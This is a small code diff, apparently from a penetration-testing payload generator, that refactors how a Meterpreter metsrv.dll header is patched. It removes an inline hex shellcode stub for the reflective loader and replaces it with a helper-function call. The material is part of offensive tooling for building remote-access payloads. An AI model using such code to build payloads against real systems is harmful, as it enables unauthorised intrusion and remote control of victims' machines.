@@ -72,9 +72,7 @@ class Payload:
         dllReplace = lambda dll,ind,s: dll[:ind] + s + dll[ind+len(s):]
 
         # patch the metsrv.dll header
-        headerPatch = "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\xF8"
-        headerPatch += "\x87\x05\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
-        headerPatch += "\x68\xe0\x1d\x2a\x0a\x68\x05\x00\x00\x00\x50\xff\xd3\x00\x00\x00"
+        headerPatch = helpers.selfcontained_patch()
         meterpreterDll = dllReplace(meterpreterDll,0,headerPatch)
 
         # patch in the default user agent string
